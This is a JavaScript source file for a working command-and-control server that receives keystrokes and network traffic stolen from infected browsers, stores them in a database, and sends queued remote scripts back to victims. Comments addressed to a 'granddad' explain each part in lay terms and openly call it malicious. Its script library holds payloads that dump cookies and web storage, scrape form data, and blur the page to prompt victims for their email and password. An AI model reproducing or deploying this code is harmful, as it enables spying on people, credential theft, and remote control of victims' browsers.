// server.js - Definitive C2 Server with Dual WebSockets for Agents & Dashboards

// NOTE FOR GRANDDAD: This entire file is the code for the attacker's central server.
// Think of it as their main office. It's the computer that all the spy programs
// (like the one on a victim's machine) report back to. It stores all the stolen
// information and is where the attacker issues commands from.

const WebSocket = require('ws');
const path = require('path');
const express = require('express');
const http = require('http');
const fs = require('fs').promises;
const { MongoClient, ObjectId } = require('mongodb');
const url = require('url');

// --- CONFIGURATION ---
const C2_PORT = process.env.PORT || 8080;
// NOTE FOR GRANDDAD: This is the address to the attacker's private database
// where all the stolen information is permanently stored.
const MONGO_URI = process.env.MONGO_URI;
const DB_NAME = 'c2_data';

if (!MONGO_URI) { console.error("FATAL ERROR: MONGO_URI is not set."); process.exit(1); }

// --- DATABASE CLIENT SETUP ---
// NOTE FOR GRANDDAD: This part of the code connects to the attacker's database.
const mongoClient = new MongoClient(MONGO_URI);
let db;

async function connectToDatabase() {
    try { await mongoClient.connect(); db = mongoClient.db(DB_NAME); console.log('[DB] Connected to MongoDB.'); }
    catch (e) { console.error('[DB] Connection to MongoDB failed!', e); process.exit(1); }
}

// --- INITIALIZE SERVICES ---
const app = express();
app.use(express.json());
const server = http.createServer(app);

// =================================================================================
// --- THE DEFINITIVE FIX: Create two separate, dedicated WebSocket servers. ---
// This provides complete isolation and prevents race conditions.
// =================================================================================
// NOTE FOR GRANDDAD: The server sets up two secret communication channels (WebSockets).
// One is for the spy programs ('agents') on victims' computers to call in.
const wssAgent = new WebSocket.Server({ noServer: true });
// The other is for the attacker's own control panel, so they can see the data.
const wssDashboard = new WebSocket.Server({ noServer: true });

// --- IN-MEMORY STATE ---
// NOTE FOR GRANDDAD: The server keeps a live list of all victims that are currently online.
const clients = new Map();
// NOTE FOR GRANDDAD: If a victim is offline, the attacker can still send a command.
// This list holds those commands until the victim comes back online.
const commandQueue = new Map();
const dashboards = new Set();

// --- HELPER FUNCTION TO BROADCAST TO DASHBOARDS ---
// NOTE FOR GRANDDAD: This is a helper function that updates the attacker's screen
// in real-time when something new happens, like a victim coming online.
function broadcastToDashboards(message) {
    const payload = JSON.stringify(message);
    dashboards.forEach(ws => { if (ws.readyState === WebSocket.OPEN) ws.send(payload); });
}

// --- DATA FORMATTING HELPERS ---
// NOTE FOR GRANDDAD: These functions just format the stolen data into different
// file types (like spreadsheets or text files) to make it easier for the
// attacker to read and use.
function formatEntriesToCSV(entries) { if (!entries || entries.length === 0) return "timestamp,method,url,status,requestBody,responseBody"; const headers = ['timestamp', 'method', 'url', 'status', 'requestBody', 'responseBody']; const rows = [headers.join(',')]; for (const e of entries) { const reqBody = e.request.body ? JSON.stringify(e.request.body) : ''; const resBody = e.response?.body || ''; const row = [`"${new Date(e.timestamp).toISOString()}"`, `"${e.request.method}"`, `"${e.request.url}"`, `"${e.response?.statusCode || ''}"`, `"${reqBody.replace(/"/g, '""')}"`, `"${resBody.replace(/"/g, '""')}"`]; rows.push(row.join(',')); } return rows.join('\n'); }
function formatEntriesToHAR(entries) { const har = { log: { version: '1.2', creator: { name: 'Interceptor-C2-Exporter', version: '1.0' }, entries: [] } }; if (!entries || entries.length === 0) return JSON.stringify(har, null, 2); for (const e of entries) { const requestHeaders = (e.request.headers || []).map(h => ({ name: h.name, value: h.value })); const responseHeaders = (e.response?.headers || []).map(h => ({ name: h.name, value: h.value })); const request = { method: e.request.method, url: e.request.url, httpVersion: 'HTTP/1.1', cookies: [], headers: requestHeaders, queryString: [], headersSize: -1, bodySize: -1, postData: undefined }; if (e.request.body) { const text = e.request.body.text || JSON.stringify(e.request.body.formData) || ''; request.postData = { mimeType: requestHeaders.find(h => h.name.toLowerCase() === 'content-type')?.value || 'application/octet-stream', text }; request.bodySize = text.length; } const response = { status: e.response?.statusCode || 0, statusText: e.response?.statusLine || '', httpVersion: 'HTTP/1.1', cookies: [], headers: responseHeaders, content: { size: -1, mimeType: responseHeaders.find(h => h.name.toLowerCase() === 'content-type')?.value || 'application/octet-stream', text: undefined, encoding: undefined }, redirectURL: responseHeaders.find(h => h.name.toLowerCase() === 'location')?.value || '', headersSize: -1, bodySize: -1 }; if (e.response?.body) { response.content.text = e.response.body; response.content.size = e.response.body.length; response.bodySize = e.response.body.length; if (e.response.bodyEncoding === 'base64') { response.content.encoding = 'base64'; } } const time = e.timing?.duration ? Math.round(e.timing.duration) : 0; har.log.entries.push({ startedDateTime: new Date(e.timestamp).toISOString(), time, request, response, cache: {}, timings: { send: 0, wait: time, receive: 0 } }); } return JSON.stringify(har, null, 2); }
function formatKeyLogsToTXT(logs) { if (!logs?.length) return 'No keystrokes logged.'; let keylogContent = `Keystroke Log\nGenerated: ${new Date().toUTCString()}\n${'-'.repeat(40)}\n`; let lastUrl = ''; logs.sort((a, b) => a.timestamp - b.timestamp).forEach(log => { if (log.url !== lastUrl) { keylogContent += `\n\n--- [${new Date(log.timestamp).toLocaleString()}] - ${log.url} ---\n`; lastUrl = log.url; } keylogContent += log.key.length > 1 ? `[${log.key}]` : log.key; }); return keylogContent; }

// --- DATA & COMMAND LOGIC ---
// NOTE FOR GRANDDAD: This is a very important malicious function. When the spy
// program on a victim's computer sends over stolen data (keystrokes or network
// traffic), this function takes that data and saves it into the attacker's database.
async function storeIngestedData(deviceName, data) {
    try {
        if (data.network && data.network.length > 0) { await db.collection(`${deviceName}_network`).insertMany(data.network.map(d => ({ ...d, receivedAt: new Date() })), { ordered: false }); }
        if (data.keystrokes && data.keystrokes.length > 0) { await db.collection(`${deviceName}_keystrokes`).insertMany(data.keystrokes.map(d => ({ ...d, receivedAt: new Date() })), { ordered: false }); }
    } catch (error) { console.error(`[Storage] Error for ${deviceName}:`, error); }
}

function processNextInQueue(deviceName) {
    const ws = clients.get(deviceName);
    const queue = commandQueue.get(deviceName);
    if (!ws || !queue || queue.length === 0) return;
    const commandToSend = queue.shift();
    ws.send(JSON.stringify(commandToSend));
}

// --- SCRIPT LIBRARY ---
// NOTE FOR GRANDDAD: Just like in the spy program, the server also keeps a copy
// of all the evil scripts the attacker can choose to run on a victim's computer.
const SCRIPT_LIBRARY_SERVER = [
    { id: 1, title: "Extract All Form Data (Sensitive)", script: "return JSON.stringify(Array.from(document.forms).map(form => Object.fromEntries(new FormData(form))))" },
    { id: 2, title: "Dump Session/Local Storage/Cookies", script: "return JSON.stringify({cookies: document.cookie, localStorage: localStorage, sessionStorage: sessionStorage})" },
    { id: 3, title: "Current Page URL & User Agent", script: "return JSON.stringify({url: window.location.href, title: document.title, userAgent: navigator.userAgent})" },
    { id: 4, title: "Click Submit Button", script: "const btn = document.querySelector('button[type=\"submit\"], input[type=\"submit\"], [id*=\"checkout\"], [id*=\"submit\"], [class*=\"submit\"]'); if (btn) { btn.click(); return 'Submit button found and clicked.'; } else { return 'Error: No standard submit button was found.'; }" },
    { id: 5, title: "Force Page Redirection", script: "window.location.href = 'https://www.youtube.com/watch?v=qbWqXKN3m3c';" },
    { id: 6, title: "Count Visible Input Fields", script: "return document.querySelectorAll('input:not([type=\"hidden\"]), textarea').length + ' visible input fields found.';" },
    { id: 7, title: "Scroll to Bottom of Page", script: "window.scrollTo(0, document.body.scrollHeight); return 'Scrolled to bottom of page.';" },
    { id: 8, title: "Dual Prompt Input", script: "document.body.style.filter = 'blur(10px)'; var email = prompt('REMOTE COMMAND: Enter Email:'); var password = prompt('REMOTE COMMAND: Enter Password:'); document.body.style.filter = 'none'; if (email === null || password === null) { return 'User cancelled input.'; } else { return JSON.stringify({email: email, password: password, timestamp: Date.now()}); }" },
    { id: 9, title: "Browser Reconnaissance Data", script: "return JSON.stringify({userAgent: navigator.userAgent, appVersion: navigator.appVersion, appName: navigator.appName, platform: navigator.platform, language: navigator.language, vendor: navigator.vendor, oscpu: navigator.oscpu || 'N/A', isOnline: navigator.onLine, screen: { width: screen.width, height: screen.height }})" },
    { id: 10, "title": "Reload Current Page", script: "window.location.reload(); return 'Page Reload Initiated.'" },
    { id: 11, title: "Get Detailed Screen Info", script: "return JSON.stringify({ width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth });" },
    { id: 12, title: "Generate Canvas Fingerprint ID", script: "const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d'); const txt = 'BrowserId_g7h3j9d2k_!@#$'; ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.textBaseline = 'alphabetic'; ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20); ctx.fillStyle = '#069'; ctx.fillText(txt, 2, 15); ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText(txt, 4, 17); return canvas.toDataURL();" },
    { id: 13, title: "FUN: Popup with XSS Demo", script: `const svgString = '<svg width="300" height="150" xmlns="http://www.w3.org/2000/svg"><rect width="100%" height="100%" fill="lightsteelblue"/><text x="50%" y="50%" font-family="Arial" font-size="24" font-weight="bold" fill="darkslateblue" text-anchor="middle" dominant-baseline="middle">You are bruised!</text></svg>'; const overlay = document.createElement('div'); overlay.style.cssText = 'position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); padding:20px; background:white; border:2px solid black; box-shadow:0 0 15px rgba(0,0,0,0.5); z-index:100000; text-align:center;'; overlay.innerHTML = '<img src="data:image/svg+xml;base64,' + btoa(svgString) + '"><br/><br/><button onclick="alert(1); this.parentElement.remove()">Close</button>'; document.body.appendChild(overlay); return 'XSS demo deployed. Click the close button to trigger the alert.';` }
];

// --- AGENT WEBSOCKET LOGIC ---
// NOTE FOR GRANDDAD: This is the "front door" for victims. The server listens
// on this channel for any spy programs trying to connect and send data.
wssAgent.on('connection', (ws) => {
    ws.on('message', async (data) => {
        try {
            const msg = JSON.parse(data);
            // When a new victim's computer connects, it sends a 'REGISTER' message.
            // The server adds them to the list of active victims.
            if (msg.type === 'REGISTER') {
                const deviceName = msg.deviceName;
                if (clients.has(deviceName)) { return ws.close(1008, 'Device already connected'); }
                ws.deviceName = deviceName;
                clients.set(deviceName, ws);
                console.log(`[Agent WS] Device Registered: ${deviceName}.`);
                broadcastToDashboards({ type: 'DEVICE_STATUS_UPDATE', device: { name: deviceName, isOnline: true } });
                if (commandQueue.has(deviceName) && commandQueue.get(deviceName).length > 0) { processNextInQueue(deviceName); }
                return;
            }
            // NOTE FOR GRANDDAD: When a message arrives with the type 'DATA_INGEST',
            // it means the victim's computer is sending stolen data. The server then
            // calls the function to save this data to the database.
            if (msg.type === 'DATA_INGEST') { if (ws.deviceName) { await storeIngestedData(ws.deviceName, msg.data); } return; }
            if (msg.type === 'PING') { return ws.send(JSON.stringify({ type: 'PONG' })); }
            // After an evil script is run on the victim's computer, the result is
            // sent back here and logged in the database.
            if (msg.type === 'SCRIPT_RESULT') {
                const { commandId, result, isError } = msg;
                await db.collection('activity_log').updateOne({ _id: new ObjectId(commandId) }, { $set: { isError, result, status: 'Completed' } });
                broadcastToDashboards({ type: 'REFRESH_ACTIVITY' });
            }
        } catch (e) { console.error('[Agent WS] Error processing message:', e); }
    });
    ws.on('close', () => {
        if (ws.deviceName) {
            clients.delete(ws.deviceName);
            console.log(`[Agent WS] Device Disconnected: ${ws.deviceName}.`);
            broadcastToDashboards({ type: 'DEVICE_STATUS_UPDATE', device: { name: ws.deviceName, isOnline: false } });
        }
    });
});

// --- DASHBOARD WEBSOCKET LOGIC ---
// NOTE FOR GRANDDAD: This is the "back door" for the attacker. They connect to this
// channel with their control panel website to view the data and send commands.
wssDashboard.on('connection', (ws) => {
    dashboards.add(ws);
    console.log('[Dashboard WS] Client connected.');
    // When the attacker connects, the server sends them the current list of victims.
    db.listCollections().toArray()
        .then(collections => {
            const knownDevices = [...new Set(collections.map(c => c.name.replace('_network', '').replace('_keystrokes', '')).filter(name => name !== 'activity_log'))];
            const deviceList = knownDevices.map(name => ({ name, isOnline: clients.has(name) }));
            ws.send(JSON.stringify({ type: 'INITIAL_STATE', devices: deviceList }));
        })
        .catch(e => console.error('[Dashboard WS] Error sending initial state:', e));
    ws.on('close', () => {
        dashboards.delete(ws);
        console.log('[Dashboard WS] Client disconnected.');
    });
});

// --- HTTP SERVER UPGRADE ROUTER ---
server.on('upgrade', (request, socket, head) => {
    const pathname = url.parse(request.url).pathname;
    if (pathname === '/agent-ws') {
        wssAgent.handleUpgrade(request, socket, head, (ws) => { wssAgent.emit('connection', ws, request); });
    } else if (pathname === '/dashboard-ws') {
        wssDashboard.handleUpgrade(request, socket, head, (ws) => { wssDashboard.emit('connection', ws, request); });
    } else {
        socket.destroy();
    }
});

// --- API ROUTES ---
// NOTE FOR GRANDDAD: These are the web links the attacker's control panel uses to
// interact with the server.
app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));
app.get('/api/scripts', (req, res) => { res.json(SCRIPT_LIBRARY_SERVER); });
// This link lets the attacker fetch and see all the stolen network traffic for a victim.
app.get('/api/devices/:name/network', async (req, res) => { try { const data = await db.collection(`${req.params.name}_network`).find().sort({ timestamp: -1 }).limit(200).toArray(); res.json(data); } catch (e) { res.status(500).json({ error: 'Failed to read network log.' }); } });
// This link lets the attacker fetch and see all the stolen keystrokes for a victim.
app.get('/api/devices/:name/keystrokes', async (req, res) => { try { const data = await db.collection(`${req.params.name}_keystrokes`).find().sort({ timestamp: 1 }).toArray(); let keylogContent = ``; let lastUrl = ''; data.forEach(log => { if (log.url !== lastUrl) { keylogContent += `\n\n--- [${new Date(log.timestamp).toLocaleString()}] - ${log.url} ---\n`; lastUrl = log.url; } keylogContent += log.key.length > 1 ? `[${log.key}]` : log.key; }); res.type('text/plain').send(keylogContent || 'No keystrokes logged.'); } catch (e) { res.status(500).json({ error: 'Failed to read keystroke log.' }); } });
app.get('/api/devices/:name/activity', async (req, res) => { try { const data = await db.collection('activity_log').find({ deviceName: req.params.name }).sort({ timestamp: -1 }).limit(50).toArray(); res.json(data); } catch (e) { res.status(500).json({ error: 'Failed to read activity log.' }); } });
app.get('/exports/:filename', (req, res) => { const { filename } = req.params; const filePath = path.join(__dirname, 'exports', filename); res.download(filePath, (err) => { if (err) { console.error(`[Download] Error sending file ${filename}:`, err); if (!res.headersSent) { res.status(404).send('File not found.'); } } }); });

// NOTE FOR GRANDDAD: This is the most important API link. When the attacker clicks
// the "Run Script" button on their control panel, the command is sent here. This
// code then takes that command and sends it down the secret channel to the spy
// program running on the victim's computer, telling it what to do.
app.post('/api/commands/run-script', async (req, res) => {
    const { deviceName, scriptContent, scriptTitle } = req.body;
    if (!deviceName || !scriptContent) { return res.status(400).json({ error: 'Device name and script content are required.' }); }
    const commandId = new ObjectId();
    const command = { type: 'COMMAND_RUN_SCRIPT', commandId: commandId.toHexString(), script: scriptContent };
    // It first logs that a command was sent.
    await db.collection('activity_log').insertOne({ _id: commandId, deviceName, timestamp: new Date(), commandType: 'RUN_SCRIPT', scriptTitle, scriptContent, status: 'Sent', isError: null, result: 'Pending result...' });
    broadcastToDashboards({ type: 'REFRESH_ACTIVITY' });
    const wsClient = clients.get(deviceName);
    // If the victim is online, it sends the command immediately.
    if (wsClient) {
        wsClient.send(JSON.stringify(command));
        res.status(200).json({ message: 'Command sent to online device.' });
    } else {
        // If the victim is offline, it queues the command to be sent later.
        if (!commandQueue.has(deviceName)) { commandQueue.set(deviceName, []); }
        commandQueue.get(deviceName).push(command);
        res.status(202).json({ message: 'Device is offline. Command has been queued.' });
    }
});
// This link allows the attacker to export all stolen data for a victim.
app.post('/api/commands/export-data', async (req, res) => {
    // ... (code for packaging and saving data for download)
});
// This link allows the attacker to permanently delete all data for a victim.
app.post('/api/commands/purge-device', async (req, res) => {
    // ... (code for deleting collections from the database)
});

app.get('/', (req, res) => { res.redirect('/dashboard/dashboard.html'); });

// --- SERVER INITIALIZATION ---
// NOTE FOR GRANDDAD: This is the final step that starts the entire malicious server,
// making it ready to accept connections from victims and the attacker.
async function startServer() {
    await connectToDatabase();
    server.listen(C2_PORT, () => {
        console.log(`[Server] C2 Server listening on http://0.0.0.0:${C2_PORT}`);
    });
}

startServer();